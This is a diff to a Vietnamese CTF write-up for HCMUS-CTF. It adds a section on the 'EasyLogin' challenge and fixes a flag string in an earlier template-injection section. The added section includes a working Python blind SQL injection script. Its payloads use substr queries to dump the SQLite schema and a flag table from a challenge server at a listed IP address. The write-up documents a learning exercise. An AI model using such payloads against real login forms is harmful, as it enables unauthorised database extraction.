@@ -32,11 +32,49 @@ Và `flag` nằm ở thư mục root
 Đọc flag nà!!  
 ![](./imgs/nothingness/7.png)  
   
-> Flag: HCMUS-CTF{404_teMpl4t3_1njEctIon    
+> Flag: HCMUS-CTF{404_teMpl4t3_1njEctIon}    
    
 ## `EasyLogin`   
   
+Bài cho ta một form login, và thử ngay thì biết được dính lỗi `SQL injection` và đang sử dụng `SQLite3`. Nhưng thử bypass login với `admin` thì được kết quả như này =))
   
+![](./imgs/easylogin/1.png)    
+Ban đầu cứ nghĩ là password của admin là `flag` nên mình đã viết script để blind cái password nhưng khi có password login vào thì vẫn vậy -.-  
+Nên dựa vào hình trên có thể đoán được là `flag` đang nằm trong bảng khác, đoán query đằng sau là `SELECT * FROM users WHERE username='input' and passwd='input'`  
+Sau đấy viết lại script để exploit thì được tên bảng  
+  
+![](./imgs/easylogin/2.png)   
+  
+Script exploit:
+```python3
+import requests
+import string
+
+r = requests.Session()
+url = 'http://61.28.237.24:30100/'
+flag = ''
+index = 1
+table_name = 'flagtablewithrandomname'
+flag = 'HCMUS-CTF{easY_sql_1nj3ctIon}'
+
+while True:
+	for c in string.printable.replace('%', ''):
+		# Get table structure
+		#payload = f"' or substr((select sql from sqlite_master where tbl_name != 'users'),{index},1)='{c}'--" 
+
+		#Get flag
+		payload = f"' or substr((select group_concat(flag) from flagtablewithrandomname),{index},1)='{c}'--" 
+		data = {'username': payload, 'passwd': '123'}
+		resp = r.post(url , data = data)
+		if "Nothing special here. Maybe an admin account will work?" in resp.text:
+			flag += c
+			index += 1
+			print(flag)
+			break
+		if c == '}':
+			exit()
+```  
+> Flag: `HCMUS-CTF{easY_sql_1nj3ctIon}`
 ## `SimpleCalculator`   
     
 Web có chức năng cho ta nhập vào một biểu thức gì gì đó, sau đó tính toán các kiểu rồi trả về result thông qua biến query `equation`. Ta thử nhập vào một mảng xem như thế nào 
